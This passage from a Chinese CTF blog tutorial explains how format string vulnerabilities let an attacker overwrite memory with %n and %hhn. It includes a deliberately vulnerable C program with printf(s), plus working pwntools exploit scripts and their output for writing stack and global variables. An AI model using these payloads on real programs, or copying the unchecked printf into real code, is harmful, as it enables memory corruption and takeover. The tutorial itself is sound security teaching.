+<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash">n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></code></pre></td></tr></table></figure>
+
+<p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p>
+<p>这里我们给出如下的程序来介绍相应的部分。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* example/overflow/overflow.c */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>makefile 在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">...[overwrite addr]....%[overwrite offset]$n<br></code></pre></td></tr></table></figure>
+
+<p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
+<ul>
+<li>确定覆盖地址</li>
+<li>确定相对偏移</li>
+<li>进行覆盖</li>
+</ul>
+<h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p>
+<h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10     ← $esp<br>0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;<br>0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000<br>0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd28│+0x1c: &quot;%d%d&quot;     ← $eax<br></code></pre></td></tr></table></figure>
+
+<p>我们可以发现在 0xffffcd14 处存储着变量 c 的数值。继而，我们再确定格式化字符串’%d%d’的地址 0xffffcd28 相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。</p>
+<h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></td></tr></table></figure>
+
+<p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p>
+<p>具体脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python3">def forc():<br>    sh = process(&#x27;./overwrite&#x27;)<br>    c_addr = int(sh.recvuntil(&#x27;\n&#x27;, drop=True), 16)<br>    print hex(c_addr)<br>    payload = p32(c_addr) + &#x27;%012d&#x27; + &#x27;%6$n&#x27;<br>    print payload<br>    #gdb.attach(sh)<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()<br><br>forc()<br></code></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 74806<br>0xfffd8cdc<br>܌��%012d%6$n<br>܌��-00000160648modified c.<br></code></pre></td></tr></table></figure>
+
+<h4 id="覆盖任意地址的内存"><a href="#覆盖任意地址的内存" class="headerlink" title="覆盖任意地址的内存"></a>覆盖任意地址的内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</p>
+<blockquote>
+<p>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p>
+</blockquote>
+<p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">aa%</span><span class="language-bash">k<span class="hljs-variable">$nxx</span></span><br></code></pre></td></tr></table></figure>
+
+<p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。</p>
+<p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh<br></code></pre></td></tr></table></figure>
+
+<p>故而我们可以构造如下的利用代码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">def fora():<br>    sh = process(&#x27;./overwrite&#x27;)<br>    a_addr = 0x0804A024<br>    payload = &#x27;aa%8$naa&#x27; + p32(a_addr)<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>对应的结果如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 76508<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 76508)<br>0xffc1729c<br><span class="hljs-meta prompt_">aaaa$</span><span class="language-bash">\xa0\x0modified a <span class="hljs-keyword">for</span> a small number.</span><br></code></pre></td></tr></table></figure>
+
+<p>其实，这里我们需要掌握的小技巧就是，我们没有必要把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。</p>
+<h5 id="覆盖小数字-1"><a href="#覆盖小数字-1" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>上面介绍了覆盖小数字，这里我们介绍如何覆盖大数字。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p>
+<p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。<br>h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。<br></code></pre></td></tr></table></figure>
+
+<p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。</p>
+<p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r<br></code></pre></td></tr></table></figure>
+
+<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure>
+
+<p>首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#x27;%6$n&#x27;+pad2+&#x27;%7$n&#x27;+pad3+&#x27;%8$n&#x27;+pad4+&#x27;%9$n&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以依次进行计算。这里给出一个基本的构造，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python3">def fmt(prev, word, index):<br>    if prev &lt; word:<br>        result = word - prev<br>        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;<br>    elif prev == word:<br>        result = 0<br>    else:<br>        result = 256 + word - prev<br>        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;<br>    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;<br>    return fmtstr<br><br><br>def fmt_str(offset, size, addr, target):<br>    payload = &quot;&quot;<br>    for i in range(4):<br>        if size == 4:<br>            payload += p32(addr + i)<br>        else:<br>            payload += p64(addr + i)<br>    prev = len(payload)<br>    for i in range(4):<br>        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)<br>        prev = (target &gt;&gt; i * 8) &amp; 0xff<br>    return payload<br>payload = fmt_str(6,4,0x0804A028,0x12345678)<br></code></pre></td></tr></table></figure>
+
+<p>其中每个参数的含义基本如下</p>
+<ul>
+<li>offset 表示要覆盖的地址最初的偏移</li>
+<li>size 表示机器字长</li>
+<li>addr 表示将要覆盖的地址。</li>
+<li>target 表示我们要覆盖为的目的变量值。</li>
+</ul>
+<p>相应的 exploit 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python3">def forb():<br>    sh = process(&#x27;./overwrite&#x27;)<br>    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)<br>    print payload<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 78547<br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 78547)<br>0xfff6f9bc<br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             ~modified b for a big number!<br></code></pre></td></tr></table></figure>
+
+<p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p>
+<h2 id="非栈上的格式化字符串漏洞"><a href="#非栈上的格式化字符串漏洞" class="headerlink" title="非栈上的格式化字符串漏洞"></a>非栈上的格式化字符串漏洞</h2><p>特点：</p>
+<p>在非栈上的内存区域（如 bss 段存储未初始化的全局变量和静态变量，堆用于动态内存分配），数据的存储和访问方式与栈不同。利用非栈上格式化字符串漏洞需要了解这些区域的内存布局和可访问性。攻击者可以通过构造特定的格式化字符串，利用格式化函数在处理这些字符串时对内存的操作，来实现对非栈上内存的读写，进而达到攻击目的。例如，通过构造含有特定偏移量的格式化字符串，可以定位到目标内存地址，并使用 %n 等格式化字符来修改内存中的数据。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF-PWN/" class="category-chain-item">CTF_PWN</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF-PWN/blog-learning/" class="category-chain-item">blog_learning</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>格式化字符串漏洞</div>
+      <div>http://example.com/格式化字符串漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>briteny-pwn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E7%A7%91%E6%8A%80%E6%96%87%E5%8C%96%E8%8A%82/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
